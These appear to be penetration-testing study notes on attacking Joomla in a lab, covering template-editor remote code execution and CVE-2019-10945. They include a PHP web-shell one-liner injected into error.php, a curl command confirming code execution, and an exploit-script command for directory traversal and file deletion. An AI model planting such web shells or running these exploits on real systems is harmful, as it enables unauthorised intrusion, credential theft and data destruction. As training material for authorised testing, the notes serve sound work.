# Attacking Joomla (CPTS Notes)

## Overview
Like WordPress and Drupal, Joomla is vulnerable to **core CVEs** and **vulnerable extensions**, and logging into the admin backend typically leads to **RCE**. Leaked/weak credentials found during recon/OSINT can often grant this access.

---

## Method 1: Abusing Built-In Functionality (Template Editor RCE)

**Goal:** Use valid admin credentials to edit a template file and inject a PHP web shell.

### Steps
1. **Log in** to the admin backend using discovered creds (e.g., `admin:admin`) at:
   `http://dev.inlanefreight.local/administrator`

   > **Troubleshooting:** If you get *"An error has occurred. Call to a member function format() on null"*, go to `.../administrator/index.php?option=com_plugins` and disable the **"Quick Icon - PHP Version Check"** plugin.

2. Navigate to **Configuration → Templates**
   `.../administrator/index.php?option=com_templates`

3. Select a template (e.g., **protostar**) → **Templates: Customise** page
   `.../administrator/index.php?option=com_templates&view=template&id=506`

4. Choose a page to edit (e.g., **error.php**) and insert a PHP one-liner:
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
   - Use a **non-standard, randomized parameter/file name** to avoid accidental discovery by other testers/attackers ("drive-by" risk)
   - Optionally password-protect or restrict access by source IP
   - **Save & Close**

5. **Confirm code execution:**
```
junior-security-analyst@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

6. From here: upgrade to an **interactive reverse shell** → pursue privesc / lateral movement.

### Cleanup & Reporting (Critical!)
- **Always remove the PHP snippet** from error.php once done
- Document in the report: file name, **file hash**, and location of any web shell planted

## Method 2: Known CVE — CVE-2019-10945

**Vulnerability:** Directory Traversal & Authenticated Arbitrary File Deletion
**Affects:** Joomla **1.5.0 through 3.9.4**
**Target in example:** `dev.inlanefreight.local` running 3.9.4 (released March 2019; current at time of writing was 4.0.3, Sept 2021)

### Context
- 426 Joomla CVEs exist overall, but most lack working PoCs
- Exploit-DB has 1,400+ Joomla entries, mostly for **extensions**, not core
- Core critical RCEs are rare — similar to WordPress

### When to use this
Only useful if the **admin login portal is authenticated-only but not accessible externally with creds yet, OR as a complementary technique** — since if you already have admin creds, template RCE (Method 1) is more direct. This exploit requires authentication too, so its main value is **listing/deleting files** via traversal (e.g., reaching `configuration.php` for DB creds, or other sensitive files).

### Usage
```
junior-security-analyst@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

**Flags:** `--url`, `--username`, `--password`, `--dir`

**Output:** Lists webroot contents:
```
administrator, bin, cache, cli, components, images, includes,
language, layouts, libraries, media, modules, plugins, templates, tmp
LICENSE.txt, README.txt, configuration.php, htaccess.txt, index.php,
robots.txt, web.config.txt
```

### Risk Notes
- Can be used to **delete files** (not recommended in engagements — destructive)
- Could expose `configuration.php` (DB credentials) if combined with file read/access
- A careless use could **break the webserver** if critical files are deleted and webserver user has write/delete perms

---

## Key Takeaways
- **Template editor RCE** is the primary/most reliable path once you have valid admin creds
- **CVE-2019-10945** is a good fallback/supplementary technique for older Joomla versions (≤3.9.4), useful for file enumeration/traversal
- Always clean up shells, log every artifact (hashes, paths), and report responsibly — don't delete files on client systems
